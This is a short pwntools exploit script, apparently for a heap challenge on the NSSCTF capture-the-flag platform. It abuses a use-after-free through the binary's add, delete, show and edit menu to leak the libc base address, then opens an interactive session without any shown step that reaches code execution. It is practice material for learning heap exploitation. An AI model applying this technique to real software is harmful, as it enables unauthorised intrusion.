from pwn import *
import sys
remote_addr = ["node4.anna.nssctf.cn", 28502]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()

def menu(idx):
    sla(b'Choice: ', str(idx).encode())

def add():
    menu(1)

def delete(idx):
    menu(2)
    sla(b'Idx: \n', str(idx).encode())

def show(idx):
    menu(3)
    sla(b'Idx: \n', str(idx).encode())

def edit(idx, content):
    menu(4)
    sla(b'Idx: \n', str(idx).encode())
    sla(b'Size: \n', str(len(content)).encode())
    sa(b'Content: \n', content)

for i in range(9):
    add()

for i in range(8):
    delete(i)

edit(7, b'\n')
show(7)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1e0c0a
pr('libc_base', libc.address)

edit(7, b'\x00')


shell()
